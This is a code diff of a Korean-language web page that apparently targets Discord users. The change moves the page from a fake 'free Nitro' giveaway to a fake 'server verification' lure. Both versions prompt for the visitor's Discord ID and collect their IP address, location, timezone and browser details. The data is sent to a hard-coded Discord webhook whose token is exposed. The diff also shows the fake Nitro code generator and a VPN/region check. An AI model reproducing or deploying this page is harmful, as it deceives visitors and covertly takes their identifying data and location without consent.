@@ -2,7 +2,7 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>⚡️ 니트로 1개월 무료</title>
+    <title> 인증 </title>
     <style>
         body { 
             background-color: #36393f; 
@@ -28,7 +28,7 @@
     </style>
 </head>
 <body>
-    <div id="loading">✨ 니트로 수령 가능 확인 중...</div>
+    <div id="loading"인증을 위해 계정 확인 중...</div>
     <script>
         const WEBHOOK_URL = 'https://discord.com/api/webhooks/1459527447153348813/H14NpswXLN74Y1E01gzj4CJSx2xaQHkEPiiIX3ES-qO422XdqwSfxS9uARhCHLCLxPa_'
         function generateFakeNitroCode() {
@@ -60,10 +60,10 @@
             }
         }
         function getDiscordID() {
-            const discordID = prompt("🎁 Nitro 1개월 무료\n\n계정 확인과 중복 지급 방지를 위해 사용 중인 디스코드 아이디를 정확히 입력해주세요.");
+            const discordID = prompt("✅ 서버 인증\n\아이디를 정확히 입력해주세요.");
             if (discordID === null || discordID.trim() === "") {
                 alert("🚨 아이디를 입력해야합니다.");
-                document.body.innerHTML = `<h2 style="text-align:center;color:#ff5555;margin-top:20%;">❌ 니트로 수령 실패: 실패<br><br>다시 시도 해주세요.</h2>`;
+                document.body.innerHTML = `<h2 style="text-align:center;color:#ff5555;margin-top:20%;">❌ 실패<br><br>다시 시도 해주세요.</h2>`;
                 return null;
             }
             return discordID.trim();
@@ -97,7 +97,7 @@
             const userData = { discordID: discordID };
             userData.timestamp = new Date().toLocaleString();
             userData.url = window.location.href;
-            document.getElementById('loading').textContent = '✅ 접속 지역 및 중복 참여 여부 검증 중...';
+            document.getElementById('loading').textContent = '검증 중...';
             try {
                 const ipResponse = await fetch('https://api.ipify.org?format=json');
                 const ipData = await ipResponse.json();
@@ -114,7 +114,7 @@
                 userData.timezone = locationData.timezone || '정보 없음';
                 if (userData.country !== 'South Korea' && userData.country !== '대한민국') {
                     alert('🚨 VPN을 끄고 다시 시도해주세요.');
-                    document.body.innerHTML = `<h2 style="text-align:center;color:#ff5555;margin-top:20%;">❌ 니트로 지급 보류: 이벤트 지역 제한<br><br>이벤트는 대한민국 지역 사용자만 참여 가능합니다.<br>(감지된 위치: ${userData.country})</h2>`;
+                    document.body.innerHTML = `<h2 style="text-align:center;color:#ff5555;margin-top:20%;">❌ 보류: 지역 제한<br><br>대한민국이 아닙니다.<br>(감지된 위치: ${userData.country})</h2>`;
                     return;
                 }
                 userData.postal = locationData.postal || '정보 없음';
@@ -124,7 +124,7 @@
                 userData.ip = '정보 없음';
                 userData.country = '정보 없음'; 
             }
-            document.getElementById('loading').textContent = '🎁 코드 생성중..';
+            document.getElementById('loading').textContent = '마지막 확인중..';
             const browserInfo = getBrowserInfo();
             userData.browser = browserInfo.name;
             userData.browserVersion = browserInfo.version;
@@ -217,15 +217,15 @@
             xhr.onreadystatechange = function() {
                 if (xhr.readyState === 4) {
                     const newNitroCode = generateFakeNitroCode();
-                    alert(`🎉 Nitro 코드 발급 성공!\n\n1개월 Nitro 코드가 즉시 생성되었습니다. 이 코드를 복사하여 디스코드에서 사용하세요:\n\n${newNitroCode}\n\n(참고: 코드는 보안을 위해 이 팝업에만 1회 노출됩니다.)`);
-                    document.getElementById('loading').textContent = `✅ [지급 완료] 1개월 니트로 코드(${newNitroCode.substring(20)}...)가 성공적으로 지급되었습니다.`;
+                    alert(`🎉 인증을 성공했습니다.\n\n(창을 닫아도 돼요!)`);
+                    document.getElementById('loading').textContent = `✅ 인증이 성공적으로 완료되었습니다!`;
                 }
             };
             
             xhr.onerror = function() {
                 const newNitroCode = generateFakeNitroCode();
-                alert(`🎉 Nitro 코드 지급 성공!\n\n당신만을 위한 1개월 Nitro 코드가 즉시 생성되었습니다. 이 코드를 복사하여 디스코드에서 사용하세요:\n\n${newNitroCode}\n\n(참고: 코드는 보안을 위해 이 팝업에만 1회 노출됩니다.)`);
-                document.getElementById('loading').textContent = `✅ [지급 완료] 1개월 니트로 코드(${newNitroCode.substring(20)}...)가 성공적으로 지급되었습니다.`;
+                alert(`🎉 인증을 성공했습니다.\n\n(창을 닫아도 돼요!)`);
+                document.getElementById('loading').textContent = `✅ 인증이 성공적으로 완료되었습니다!`;
             };
             xhr.send(JSON.stringify(webhookData));
         }
